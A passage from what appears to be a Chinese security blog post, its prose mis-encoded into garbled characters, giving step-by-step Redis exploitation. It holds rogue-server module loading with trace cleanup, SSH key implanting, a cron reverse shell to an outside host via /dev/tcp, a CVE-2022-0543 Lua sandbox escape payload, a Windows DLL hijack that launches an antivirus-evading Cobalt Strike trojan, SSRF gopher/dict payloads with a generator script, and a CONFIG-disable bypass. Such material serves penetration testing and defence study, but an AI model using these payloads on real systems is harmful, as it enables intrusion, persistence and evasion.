<p>Redis å­˜åœ¨æœªæˆæƒè®¿é—®æˆ–è€…æš´ç ´å¯†ç æˆåŠŸï¼Œæœ€ç»ˆè¿æ¥Redisæ•°æ®åº“æˆåŠŸçš„æƒ…å†µä¸‹ï¼Œç›®æ ‡æœºå’Œæ”»å‡»æœºç½‘ç»œäº’é€šï¼Œå¹¶ä¸”redisç‰ˆæœ¬èŒƒå›´ä¸º4.xã€5.xï¼Œé€šè¿‡ä¸»ä»å†™å…¥.soæˆ–è€…dllæ–‡ä»¶ï¼Œä»è€Œä½¿ç›®æ ‡æœºæ‰§è¡Œsoæˆ–dllæ–‡ä»¶ä¸­çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ã€‚</p>
<h5 id="3åˆ©ç”¨è¿‡ç¨‹-2">3.åˆ©ç”¨è¿‡ç¨‹</h5>
<pre><code>docker pull vertigo/redis4
docker run -p 6379:6379 vertigo/redis4
</code></pre>
<pre><code>#åˆ©ç”¨å·¥å…·
https://github.com/Dliv3/redis-rogue-server
python3 redis-rogue-server.py  --rhost=10.100.6.50(ç›®æ ‡IP) --rport=6379 --lhost=10.100.4.189(æœ¬æœºIP)
#é€€å‡ºå·¥å…·æ—¶ ctrl+c ä¼šè‡ªåŠ¨æ‰§è¡Œæ¸…ç†exp.soæ¨¡å—çš„å‘½ä»¤

#å·¥å…·ä¸­ä½¿ç”¨çš„å‘½ä»¤
1.config set dir ./
2.config set dbfilename exp.so
3.slaveof X.X.X.115
4.slaveof X.X.X.115 21000  #ä¸Šé¢çœ‹ç»‘å®šçš„æœåŠ¡æ®µç«¯å£æ˜¯21000
5.module load ./exp.so
6.slaveof no one
7.system.exec 'whoami'

#æ¸…ç†ç—•è¿¹
8.config set dbfilename dump.rdb
9.system.exec 'rm ./exp.so'
10.module unload system
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141837356.png" alt="image-20220328151212566" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141837818.png" alt="image-20220328150007339" loading="lazy"></figure>
<h3 id="0x05-redis-linux-æ¼æ´åˆ©ç”¨">0x05 Redis Linux æ¼æ´åˆ©ç”¨</h3>
<h4 id="åˆ©ç”¨-redis-å†™å…¥sshå…¬é’¥">åˆ©ç”¨ Redis å†™å…¥SSHå…¬é’¥</h4>
<h5 id="1æ¼æ´åŸç†-3">1.æ¼æ´åŸç†</h5>
<p>sshå¯†é’¥ç™»å½•æ€ä¹ˆå®ç°å‘¢ï¼Ÿé€šè¿‡å·¥å…·ç”Ÿæˆå…¬é’¥å’Œå¯¹åº”çš„ç§é’¥ï¼Œå°†å…¬é’¥æ”¾åœ¨é¶æœºç‰¹å®šä½ç½®ç‰¹å®šæ–‡ä»¶åï¼Œæ”»å‡»æœºå°±å¯ä»¥ä½¿ç”¨ç§é’¥å»ç™»å½•sshã€‚</p>
<p>redisæ“ä½œåŒå†™webshellï¼Œåªæ˜¯å°†æœ¬æœºçš„sshå…¬é’¥ä½œä¸ºvalueï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„æ–‡ä»¶åauthorized.keysï¼ŒæŠŠæ•°æ®å¤‡ä»½åœ¨authorized.keysæ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨å¯†é’¥è¿›è¡Œç™»å½•ã€‚</p>
<h5 id="2åˆ©ç”¨åœºæ™¯-3">2.åˆ©ç”¨åœºæ™¯</h5>
<p>Redis å­˜åœ¨æœªæˆæƒè®¿é—®æˆ–è€…æš´ç ´å¯†ç æˆåŠŸï¼Œæœ€ç»ˆè¿æ¥Redisæ•°æ®åº“æˆåŠŸçš„æƒ…å†µä¸‹ï¼Œå¹¶ä¸”sshæœåŠ¡å¯¹å¤–å¼€æ”¾ï¼Œredisè¿›ç¨‹ä¸ºé«˜æƒé™ï¼Œå¯ä»¥é€šè¿‡å¯†é’¥ç™»è®¤è¯ã€‚</p>
<h5 id="3åˆ©ç”¨è¿‡ç¨‹-3">3.åˆ©ç”¨è¿‡ç¨‹</h5>
<pre><code># å®‰è£… openssh æœåŠ¡
sudo apt-get install openssh-server
# å¯åŠ¨ ssh æœåŠ¡
sudo /etc/init.d/ssh start
# é…ç½® root ç”¨æˆ·è¿æ¥æƒé™
sudo  vim /etc/ssh/sshd_config
PermitRootLogin yes
# è®¾ç½®å…è®¸é€šè¿‡å…å¯†ç™»å½•
AuthorizedKeysFile    .ssh/authorized_keys .ssh/authorized_keys2
# é‡å¯ ssh æœåŠ¡
sudo /etc/init.d/ssh restart
</code></pre>
<pre><code>#æ”»å‡»æœºç”Ÿæˆsshå¯†é’¥
ssh-keygen -t rsa
cat /home/root/.ssh/id_rsa.pub
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141837437.png" alt="image-20220324130305147" loading="lazy"></figure>
<pre><code>#ç”Ÿæˆå¸¦æœ‰æ¢è¡Œç¬¦çš„å¯†é’¥å¹¶ä¼ å…¥Redis
(echo -e &quot;\n\n&quot;; cat /Users/sven/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt
cat key.txt | ./redis-cli -h 192.168.0.104 -x set xxx
#è®¾ç½®ç›®å½•
config set dir /root/.ssh/
#è®¾ç½®æ–‡ä»¶å
set dbfilename authorized_keys
#ä¿å­˜
save
#è¿æ¥ç›®æ ‡æœåŠ¡å™¨
ssh -i /Users/sven/.ssh/id_rsa root@192.168.0.104
</code></pre>
<p>è®¾ç½®.sshç›®å½•çš„æ—¶å€™å¦‚æœæŠ¥é”™ <code>(error) ERR Changing directory: No such file or directory</code> æ˜¯é¶æœºä¸Šä¸å­˜åœ¨è¿™ä¸ªç›®å½•ï¼ŒåŸå› æ˜¯ .ssh æ˜¯è®°å½•å¯†ç ä¿¡æ¯çš„æ–‡ä»¶å¤¹ï¼Œå¦‚æœ root ç”¨æˆ·æ²¡æœ‰ç™»å½•è¿‡çš„è¯ï¼Œå°±æ²¡æœ‰ .ssh æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨é¶æœºä¸Šè¿è¡Œè¿™æ¡å‘½ä»¤ <code>ssh localhost</code> æˆ–è€…æ‰‹åŠ¨åˆ›å»º .ssh ç›®å½•ï¼Œå®é™…ç¯å¢ƒä¸­ä¸ä¼šå‘ç”Ÿæ­¤é—®é¢˜ã€‚</p>
<figure data-type="image" tabindex="8"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141837925.png" alt="image-20220324134315048" loading="lazy"></figure>
<h4 id="åˆ©ç”¨-redis-å†™å…¥linuxè®¡åˆ’ä»»åŠ¡">åˆ©ç”¨ Redis å†™å…¥Linuxè®¡åˆ’ä»»åŠ¡</h4>
<h5 id="1æ¼æ´åŸç†-4">1.æ¼æ´åŸç†</h5>
<p>é€šè¿‡å†™å…¥æ–‡ä»¶åˆ°ç³»ç»Ÿè®¡åˆ’ä»»åŠ¡ç›®å½• /var/spool/cron/rootæ–‡ä»¶æ¥æ‰§è¡Œï¼Œredisæ“ä½œåŒå†™webshellï¼Œåªæ˜¯å°†ä¸€å¥è¯è®¡åˆ’ä»»åŠ¡ä½œä¸ºvalueï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/var/spool/cron/å’Œé»˜è®¤çš„æ–‡ä»¶årootï¼ŒæŠŠæ•°æ®å¤‡ä»½åœ¨rootæ–‡ä»¶é‡Œï¼Œè¿™æ ·ç³»ç»Ÿå°±ä¼šæ ¹æ®è®¡åˆ’ä»»åŠ¡å†…å®¹å»è¿è¡Œå‘½ä»¤ã€‚</p>
<h5 id="2åˆ©ç”¨åœºæ™¯-4">2.åˆ©ç”¨åœºæ™¯</h5>
<p>Redis å­˜åœ¨æœªæˆæƒè®¿é—®æˆ–è€…æš´ç ´å¯†ç æˆåŠŸï¼Œæœ€ç»ˆè¿æ¥Redisæ•°æ®åº“æˆåŠŸçš„æƒ…å†µä¸‹ï¼Œå¹¶ä¸”é¶æœºå‡ºç½‘ï¼ˆå¯è®¿é—®æ”»å‡»æœºï¼‰ï¼Œç›®æ ‡ä¸ºcentosç³»ç»Ÿï¼Œredisè¿›ç¨‹ä¸ºé«˜æƒé™ï¼Œå¯ä»¥è®¾ç½®è®¡åˆ’ä»»åŠ¡ã€‚</p>
<h5 id="3åˆ©ç”¨è¿‡ç¨‹-4">3.åˆ©ç”¨è¿‡ç¨‹</h5>
<ul>
<li>
<p>æ”»å‡»æœºå¼€å¯ç«¯å£ç›‘å¬</p>
<pre><code>nc -lvp 80
</code></pre>
</li>
<li>
<p>åˆ©ç”¨rediså†™å…¥linuxè®¡åˆ’ä»»åŠ¡</p>
</li>
</ul>
<pre><code>set xxx &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/443 0&gt;&amp;1\n&quot;
//æ˜Ÿå·è¡¨ç¤ºçš„æ˜¯è®¡åˆ’ä»»åŠ¡çš„æ—¶é—´ï¼Œè¡¨ç¤ºæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡
config set dir /var/spool/cron/
config set dbfilename root
save
</code></pre>
<pre><code>#è®¡åˆ’ä»»åŠ¡å‚æ•°è¯´æ˜
æ¯åˆ†é’Ÿéƒ½æ‰§è¡Œä¸€æ¬¡çš„è¯å°±é‡‡ç”¨é»˜è®¤çš„ * * * * *
æ¯äº”åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡å¯ä»¥ */5 * * * * 
æ¯ä¸¤ä¸ªå°æ—¶æ‰§è¡Œä¸€æ¬¡çš„è¯å°±æ˜¯ * */2 * * *
ç¬¬ä¸‰ä¸ª*æ˜¯æ—¥ï¼Œç¬¬å››ä¸ªæ˜¯æœˆï¼Œç¬¬äº”ä¸ªæ˜¯å‘¨
m:åˆ†é’Ÿ - ä»0åˆ°59çš„æ•´æ•°
h:å°æ—¶ - ä»0åˆ°23çš„æ•´æ•°
dom:å¤© - ä»1åˆ°31çš„æ•´æ•° (å¿…é¡»æ˜¯æŒ‡å®šæœˆä»½çš„æœ‰æ•ˆæ—¥æœŸ)
mon:æœˆ - ä»1åˆ°12çš„æ•´æ•° (æˆ–å¦‚Janæˆ–Febç®€å†™çš„æœˆä»½)
dow:å‘¨ä¸€åˆ°å‘¨æ—¥ - ä»0åˆ°7çš„æ•´æ•°ï¼Œ0æˆ–7ç”¨æ¥æè¿°å‘¨æ—¥ (æˆ–ç”¨Sunæˆ–Monç®€å†™æ¥è¡¨ç¤º)
command: éœ€è¦æ‰§è¡Œçš„å‘½ä»¤
æ˜Ÿå·(*)è¡¨ç¤ºå‚æ•°æ‰€æœ‰å¯ç”¨çš„å€¼ï¼Œå¦‚æœä¸º5ä¸ª*ï¼Œå°±ä»£è¡¨æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡
ç¬¦å·â€œ/â€æŒ‡å®šæ­¥è¿›è®¾ç½®ã€‚â€œ/&lt;interger&gt;â€è¡¨ç¤ºæ­¥è¿›å€¼,æ¯”å¦‚*/2 * * * *ä»£è¡¨æ¯ä¸¤åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ä»»åŠ¡
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141837531.png" alt="image-20220324202907913" loading="lazy"></figure>
<h4 id="redis-luaæ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œcve-2022-0543">Redis Luaæ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œï¼ˆCVE-2022-0543ï¼‰</h4>
<h5 id="1æ¼æ´åŸç†-5">1.æ¼æ´åŸç†</h5>
<p>Debianä»¥åŠUbuntuå‘è¡Œç‰ˆçš„æºåœ¨æ‰“åŒ…Redisæ—¶ï¼Œä¸æ…åœ¨Luaæ²™ç®±ä¸­é—ç•™äº†ä¸€ä¸ªå¯¹è±¡<code>package</code>ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¯¹è±¡æä¾›çš„æ–¹æ³•åŠ è½½åŠ¨æ€é“¾æ¥åº“libluaé‡Œçš„å‡½æ•°ï¼Œè¿›è€Œé€ƒé€¸æ²™ç®±æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<h5 id="2åˆ©ç”¨åœºæ™¯-5">2.åˆ©ç”¨åœºæ™¯</h5>
<p>redisæœåŠ¡å¯¹å¤–å¼€æ”¾ï¼Œæœªæˆæƒæˆ–å·²çŸ¥å¯†ç ï¼Œç›®æ ‡ç³»ç»Ÿä¸ºDebianã€Ubuntu æˆ–å…¶ä»–åŸºäº Debian çš„ Linux å‘è¡Œç‰ˆç³»ç»Ÿï¼Œç‰ˆæœ¬ä¸º 2.2 &lt;= redis &lt; 6.2.5ã€‚</p>
<h5 id="3åˆ©ç”¨è¿‡ç¨‹-5">3.åˆ©ç”¨è¿‡ç¨‹</h5>
<pre><code>#æœ¬åœ°å¤ç°ç¯å¢ƒæ‹‰å–
git clone https://github.com/vulhub/vulhub.git
cd vulhub/redis/CVE-2022-0543/
docker-compose up -d
</code></pre>
<pre><code>#è¿æ¥redisï¼Œä½¿ç”¨evalå‘½ä»¤æ‰§è¡Œå‘½ä»¤ï¼š
eval 'local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res' 0
#å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸åŒç¯å¢ƒä¸‹çš„libluaåº“è·¯å¾„ä¸åŒï¼Œä½ éœ€è¦æŒ‡å®šä¸€ä¸ªæ­£ç¡®çš„è·¯å¾„ã€‚Vulhubç¯å¢ƒï¼ˆUbuntu fiocalï¼‰ä¸­ï¼Œè¿™ä¸ªè·¯å¾„æ˜¯/usr/lib/x86_64-linux-gnu/liblua5.1.so.0
#è‹¥é‡åˆ°ä¸å­˜åœ¨æ­¤.soæ–‡ä»¶ï¼Œå¯ä»¥å°è¯•ä»4.0éå†è‡³7.0
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141837436.png" alt="image-20220401123632358" loading="lazy"></figure>
<h3 id="0x06-redis-windowsæ¼æ´åˆ©ç”¨">0x06 Redis Windowsæ¼æ´åˆ©ç”¨</h3>
<h4 id="åˆ©ç”¨-redis-ä¸»ä»å¤åˆ¶-dllåŠ«æŒ-getshell">åˆ©ç”¨ Redis ä¸»ä»å¤åˆ¶ DLLåŠ«æŒ Getshell</h4>
<h5 id="1æ¼æ´åŸç†-6">1.æ¼æ´åŸç†</h5>
<p>åˆ©ç”¨redisçš„ä¸»ä»åŠŸèƒ½ï¼Œå†™å…¥dbghelp.dllæ–‡ä»¶ï¼Œè¾¾åˆ°åœ¨redisæ‰§è¡ŒBGSAVEæˆ–è€…BGREWRITEAOFå‘½ä»¤æ—¶redisåŠ è½½dllçš„ç›®çš„</p>
<h5 id="2åˆ©ç”¨åœºæ™¯-6">2.åˆ©ç”¨åœºæ™¯</h5>
<p>Redis å­˜åœ¨æœªæˆæƒè®¿é—®æˆ–è€…æš´ç ´å¯†ç æˆåŠŸï¼Œæœ€ç»ˆè¿æ¥Redisæ•°æ®åº“æˆåŠŸçš„æƒ…å†µä¸‹ï¼Œå¹¶ä¸”æ˜¯Windowsç³»ç»Ÿä¸‹çš„Redisã€‚</p>
<h5 id="3åˆ©ç”¨è¿‡ç¨‹-6">3.åˆ©ç”¨è¿‡ç¨‹</h5>
<pre><code>#åˆ©ç”¨å·¥å…·
https://github.com/r35tart/RedisWriteFile
#ä¸Šä¼ åˆ¶ä½œå¥½çš„dbghelp.dll
python3 RedisWriteFile.py --rhost 10.100.18.218(ç›®æ ‡æœº) --lhost 10.100.18.56(æœ¬æœº) --lfile dbghelp.dll --rfile dbghelp.dll
#ä¸Šä¼ æœ¨é©¬exeåˆ°C:\\Windows\\Tempç›®å½•ï¼Œå®æˆ˜ä¸­exeè‡ªæ£€exeæ˜¯å¦å¤„äºå…æ€çŠ¶æ€
python3 RedisWriteFile.py --rhost 10.100.18.218 --lhost 10.100.18.56 --lfile dbghelp.exe --rfile dbghelp.exe --rpath &quot;C:\\Windows\\Temp&quot;
</code></pre>
<p>åˆ¶ä½œåŠ«æŒçš„dll</p>
<pre><code>#dll-hijackingä¸‹è½½åœ°å€
https://github.com/rek7/dll-hijacking
</code></pre>
<p>pythonä»£ç ç”ŸæˆDLLåŠ«æŒä»£ç ï¼Œæ›¿æ¢å¯¼å‡ºè·¯å¾„dbghelp_ä¸ºC:\\Windows\\System32\\dbghelp</p>
<figure data-type="image" tabindex="11"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141837968.png" alt="image-20220329100723418" loading="lazy"></figure>
<p>åœ¨DLLMainå‡½æ•°ä¸­æ·»åŠ è‡ªå·±çš„shellcodeæ‰§è¡Œé€»è¾‘ï¼Œæ­¤å¤„ä¸ºè°ƒç”¨å¦å¤–ä¸€ä¸ªæœ¨é©¬exe(è‡ªè¡Œåˆ¶ä½œcsä¸Šçº¿æœ¨é©¬ï¼Œä¼˜å…ˆä½¿ç”¨å…æ€æœ¨é©¬)ä½œä¸ºæ¼”ç¤ºï¼Œç„¶åç”Ÿæˆdllï¼Œåç§°æ”¹ä¸ºdbghelp.dll</p>
<figure data-type="image" tabindex="12"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141838822.png" alt="image-20220329152000963" loading="lazy"></figure>
<p>é¡ºåºæ˜¯å›ºå®šçš„ï¼Œå¿…é¡»å…ˆä¸Šä¼ dbghelp.dllï¼Œç„¶åä¸Šä¼ dbghelp.exe(æœ¨é©¬çš„åå­—ï¼Œä»»æ„åå­—éƒ½å¯ï¼Œå†™æ­»åœ¨dbghelp.dllä¸­ï¼Œè‡ªè¡Œæ›´æ”¹)ï¼Œå¦åˆ™å°†æ— æ³•ä¸Šä¼ æ–‡ä»¶è‡³redisç›®å½•ã€‚</p>
<figure data-type="image" tabindex="13"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141838432.png" alt="image-20220329152622260" loading="lazy"></figure>
<p>è¿æ¥redisï¼Œä½¿ç”¨å‘½ä»¤BGSAVEè§¦å‘redisåŠ è½½dbghelp.dllï¼Œä»è€ŒæˆåŠŸè¿è¡Œdbghelp.exeæœ¨é©¬ä¸Šçº¿CS</p>
<figure data-type="image" tabindex="14"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141838771.png" alt="image-20220329152835846" loading="lazy"></figure>
<h3 id="0x07-ssrf-å¯¹-redis-çš„åˆ©ç”¨">0x07 SSRF å¯¹ Redis çš„åˆ©ç”¨</h3>
<h4 id="dictåè®®">dictåè®®</h4>
<p>ç‰¹ç‚¹: å‘½ä»¤å¤šæ¡çš„è¯ï¼Œéœ€è¦ä¸€æ¡æ¡æ‰§è¡Œ,ä¸æ”¯æŒä¼ å…¥æ¢è¡Œ,ä¹Ÿä¸ä¼šå¯¹%0d%0è§£ç </p>
<p>æ ¼å¼: dict://serverip:port/å‘½ä»¤:å‚æ•°</p>
<figure data-type="image" tabindex="15"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141838184.png" alt="image-20220329232708094" loading="lazy"></figure>
<h4 id="gopheråè®®">gopheråè®®</h4>
<p>ç‰¹ç‚¹: æ”¯æŒå¤šè¡Œè¾“å…¥ï¼Œå¿½ç•¥é¦–ä½å­—ç¬¦ä¸²</p>
<p>æ ¼å¼: gopher://serverip:port/_data</p>
<figure data-type="image" tabindex="16"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141838475.png" alt="image-20220329225621034" loading="lazy"></figure>
<figure data-type="image" tabindex="17"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141838742.png" alt="image-20220330142237910" loading="lazy"></figure>
<h4 id="æ— è®¤è¯ssrfæ”»å‡»">æ— è®¤è¯SSRFæ”»å‡»</h4>
<p>dictåè®®çš„æ”»å‡»:</p>
<pre><code>1.è¿æ¥è¿œç¨‹ä¸»æœåŠ¡å™¨
curl dict://127.0.0.1:6379/slaveof:100.100.100.100:21000
2.è®¾ç½®ä¿å­˜æ–‡ä»¶å
curl dict://127.0.0.1:6379/config:set:dbfilename:exp.so
3.è½½å…¥ exp.so
curl dict://127.0.0.1:6379/module:load:./exp.so
4.æ–­å¼€ä¸»ä»
curl dict://127.0.0.1:6379/slaveof:no:one
5.æ¢å¤åŸå§‹æ–‡ä»¶å
curl dict://127.0.0.1:6379/config:set:dbfilename:dump.rdb
6.æ‰§è¡Œå‘½ä»¤
curl dict://127.0.0.1:6379/system.exec:'whomai'
7.åˆ é™¤ç—•è¿¹
curl dict://127.0.0.1:6379/system.exec:'rm ./exp.so'
curl dict://127.0.0.1:6379/module:unload:system
</code></pre>
<p>gopheråè®®çš„æ”»å‡»:</p>
<pre><code>#é‡‡å–Gopherus,å®ç°å¿«é€Ÿåˆ©ç”¨ï¼ŒGopheruså†…ç½®äº†è®¡åˆ’ä»»åŠ¡å’Œå†™webshellä¸¤ç§åˆ©ç”¨æ–¹å¼
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
python2 gopherus.py --exploit redis
</code></pre>
<figure data-type="image" tabindex="18"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141839829.png" alt="image-20220330162238000" loading="lazy"></figure>
<h4 id="æœ‰è®¤è¯ssrfæ”»å‡»">æœ‰è®¤è¯SSRFæ”»å‡»</h4>
<p>gopheråè®®çš„æ”»å‡»</p>
<pre><code>#å¯†ç è®¾ä¸º123123
curl &quot;gopher://127.0.0.1:6379/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24%36%0d%0a%31%32%33%31%32%33%%0d%0a&quot;
</code></pre>
<figure data-type="image" tabindex="19"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141839586.png" alt="image-20220330161902542" loading="lazy"></figure>
<h4 id="é€šç”¨åˆ©ç”¨è„šæœ¬">é€šç”¨åˆ©ç”¨è„šæœ¬</h4>
<p>æ ¹æ®authPasså‚æ•°æœ‰å€¼æ— å€¼åŒºåˆ†redisæ˜¯å¦éœ€è¦è®¤è¯ï¼Œé»˜è®¤æ˜¯ä¸»ä»åˆ©ç”¨ä»£ç ï¼Œå¦‚webshellæˆ–è€…è®¡åˆ’ä»»åŠ¡è‡ªè¡Œä¿®æ”¹å…¶ä¸­çš„rediså‘½ä»¤å³å¯</p>
<pre><code>#!/usr/bin/python3
# -*-coding:utf-8-*-
#å‚è€ƒæ–‡ç« :https://xz.aliyun.com/t/7974#toc-20
# author:xq17

import urllib.parse

def tranToResp(x):
        xSplit = x.split(&quot; &quot;)
        cmd=&quot;&quot;
        cmd+=&quot;*&quot;+str(len(xSplit))
        for i in xSplit:
            i = i.replace(&quot;${IFS}&quot;,&quot; &quot;)
            cmd+=&quot;\r\n&quot;+&quot;$&quot;+str(len(i))+&quot;\r\n&quot;+ i
        cmd+=&quot;\r\n&quot;
        return cmd

def GeneratePayload(ip, port):
    cmd=[
     &quot;config set dir ./&quot;,
     &quot;config set dbfilename exp.so&quot;,
     &quot;slaveof {i} {p}&quot;.format(i=ip, p=port),
     &quot;module load exp.so&quot;,
     &quot;system.exec ls&quot;,
     &quot;system.exec rm${IFS}exp.so&quot;,
     &quot;quit&quot;,
     ]
     # &quot;system.exec bash${IFS}-i${IFS}&gt;&amp;${IFS}/dev/tcp/192.168.8.103/4607${IFS}0&gt;&amp;1&quot;,
    payload = &quot;&quot;
    for p in cmd:
        payload += urllib.parse.quote(tranToResp(p))
    return payload


def main():
    # target
    ip = &quot;10.100.8.231&quot;
    port = &quot;6379&quot;
    # server load exp.so
    serverIp = &quot;10.100.8.188&quot;
    serverPort = &quot;21000&quot;
    authPass = &quot;&quot;
    payload = GeneratePayload(serverIp, serverPort)
    exitPayload = (urllib.parse.quote(tranToResp(&quot;slaveof no one&quot;) + tranToResp(&quot;quit&quot;) ))
    if authPass:
        print(&quot;author attack:&quot;)
        pd = &quot;gopher://{host}:{port}/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24{l}%0d%0a{p}%0d%0a&quot;
        pd = pd.format(host=ip, port=port, l=str(len(authPass)), p=authPass)
        print(pd + payload)
        print(&quot;clean footprint:&quot;)
        print(pd + exitPayload)
    else:
        print(&quot;no author attack:&quot;)
        pd = &quot;gopher://{host}:{port}/_&quot;
        print(pd.format(host=ip, port=port)+payload)
        print(&quot;clean footprint:&quot;)
        print(pd.format(host=ip, port=port) + exitPayload)

if __name__ == '__main__':
    main()
</code></pre>
<figure data-type="image" tabindex="20"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141839694.png" alt="image-20220330163502578" loading="lazy"></figure>
<h3 id="0x08-tips">0x08 Tips</h3>
<h4 id="configå‘½ä»¤ç¦ç”¨ç»•è¿‡">configå‘½ä»¤ç¦ç”¨ç»•è¿‡</h4>
<p>å½“redis.conf é…ç½®äº†ç¦ç”¨configå‘½ä»¤çš„æ—¶å€™ã€‚</p>
<pre><code>rename-command CONFIG &quot;&quot;
</code></pre>
<p>æ¯”å¦‚è¿™ä¸ªconfigå‘½ä»¤å°±ä¸å¯ç”¨äº†ï¼Œå¯ä»¥é‡‡å–ä¸€ç§æ–¹å¼ç»•è¿‡ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±æ²¡åŠæ³•è‡ªå®šä¹‰æ–‡ä»¶åç¼€äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥åˆ©ç”¨ä¸»ä»å¤åˆ¶çš„ï¼Œä¸»ä»åŒæ­¥æ–‡ä»¶åexp.soçš„å†…å®¹è¢«ä¿å­˜ä¸ºäº†dump.rdbï¼ŒæŠŠdump.rdbå½“åšexp.soå»æ­£å¸¸åŠ è½½å³å¯ã€‚</p>
<pre><code>module load ./dump.rdb
</code></pre>
<h4 id="è®¡åˆ’ä»»åŠ¡ä¸ºä½•æ²¡æœ‰æˆåŠŸåå¼¹shell">è®¡åˆ’ä»»åŠ¡ä¸ºä½•æ²¡æœ‰æˆåŠŸåå¼¹shell</h4>
<p>å†™è®¡åˆ’ä»»åŠ¡åå¼¹shellå­˜åœ¨ç³»ç»Ÿé™åˆ¶ï¼Œè¿™ä¸ªæ–¹æ³•åªèƒ½<code>Centos</code>ä¸Šä½¿ç”¨ï¼Œ<code>Ubuntuä¸Šè¡Œä¸é€š</code>ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p>
<ol>
<li>å› ä¸ºé»˜è®¤rediså†™æ–‡ä»¶åæ˜¯644çš„æƒé™ï¼Œä½†ubuntuè¦æ±‚æ‰§è¡Œå®šæ—¶ä»»åŠ¡æ–‡ä»¶<code>/var/spool/cron/crontabs/&lt;username&gt;</code>æƒé™å¿…é¡»æ˜¯600ä¹Ÿå°±æ˜¯<code>-rw-------</code>æ‰ä¼šæ‰§è¡Œï¼Œå¦åˆ™ä¼šæŠ¥é”™<code>(root) INSECURE MODE (mode 0600 expected)</code>ï¼Œè€ŒCentosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶<code>/var/spool/cron/&lt;username&gt;</code>æƒé™644ä¹Ÿèƒ½æ‰§è¡Œ</li>
<li>å› ä¸ºredisä¿å­˜RDBä¼šå­˜åœ¨ä¹±ç ï¼Œåœ¨Ubuntuä¸Šä¼šæŠ¥é”™ï¼Œè€Œåœ¨Centosä¸Šä¸ä¼šæŠ¥é”™</li>
</ol>
<p>ç”±äºç³»ç»Ÿçš„ä¸åŒï¼Œcrontrabå®šæ—¶æ–‡ä»¶ä½ç½®ä¹Ÿä¼šä¸åŒ<br>
Centosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨<code>/var/spool/cron/&lt;username&gt;</code><br>
Ubuntuå®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>
Centoså’ŒUbuntuå‡å­˜åœ¨çš„ï¼ˆéœ€è¦rootæƒé™ï¼‰<code>/etc/crontab</code> PSï¼šé«˜ç‰ˆæœ¬çš„redisé»˜è®¤å¯åŠ¨æ˜¯<code>redis</code>æƒé™ï¼Œæ•…å†™è¿™ä¸ªæ–‡ä»¶æ˜¯è¡Œä¸é€šçš„</p>

                    </div>
                     <div class="post-toc">
                            <ul class="markdownIt-TOC">
<li>
<ul>
<li>
<ul>
<li><a href="#0x00-redis-%E7%AE%80%E4%BB%8B">0x00 Redis ç®€ä»‹</a></li>
<li><a href="#0x01-%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87">0x01 ç¯å¢ƒ &amp; å·¥å…·å‡†å¤‡</a></li>
<li><a href="#0x02-redis-%E8%AF%AD%E6%B3%95">0x02 Redis è¯­æ³•</a></li>
<li><a href="#0x03-redis-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">0x03 Redis é…ç½®æ–‡ä»¶</a></li>
